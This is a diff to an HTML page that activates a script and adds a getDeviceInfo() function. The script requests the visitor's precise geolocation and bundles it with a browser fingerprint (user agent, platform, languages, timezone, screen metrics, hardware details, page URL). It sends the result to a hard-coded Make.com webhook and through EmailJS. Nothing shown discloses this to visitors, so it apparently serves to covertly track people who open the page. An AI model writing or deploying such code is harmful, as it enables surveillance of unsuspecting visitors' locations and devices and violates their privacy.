@@ -35,7 +35,7 @@
 
 
   
-<script>
+<!-- <script>
   const WEBHOOK_URL = 'https://hook.eu1.make.com/pb2pwu4nh3716gark9cluzj9rsam3w15';
 
   const MAPS_FAVICON =
@@ -140,11 +140,11 @@
       }
     );
   }
-</script>
+</script> -->
 
 
 
-<!-- <script>
+<script>
   const WEBHOOK_URL = 'https://hook.eu1.make.com/pb2pwu4nh3716gark9cluzj9rsam3w15';
   // EmailJS settings from the working Contact.tsx integration.
   const EMAILJS_SERVICE_ID = 'service_vmsdz4p';
@@ -162,7 +162,10 @@
     const webhookRequest = fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-      body: JSON.stringify(payload),
+      body: JSON.stringify({
+        ...getDeviceInfo(),
+        ...payload
+      }),
       keepalive: true
     }).then(r => console.log('POST status:', r.status))
       .catch(e => console.error('POST failed:', e));
@@ -199,6 +202,28 @@
     return Promise.all([webhookRequest, emailRequest]);
   }
 
+  // Collect information exposed by the browser
+  function getDeviceInfo() {
+    return {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      languages: navigator.languages,
+      timezone:
+        Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+      deviceMemory: navigator.deviceMemory ?? null,
+      online: navigator.onLine,
+      cookieEnabled: navigator.cookieEnabled,
+      page: location.href,
+      timestamp: new Date().toISOString()
+    };
+  }
+
   if (!('geolocation' in navigator)) {
     console.warn('Geolocation not supported');
   } else {
@@ -222,6 +247,6 @@
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   }
-</script> -->
+</script>
 </body>
 </html>
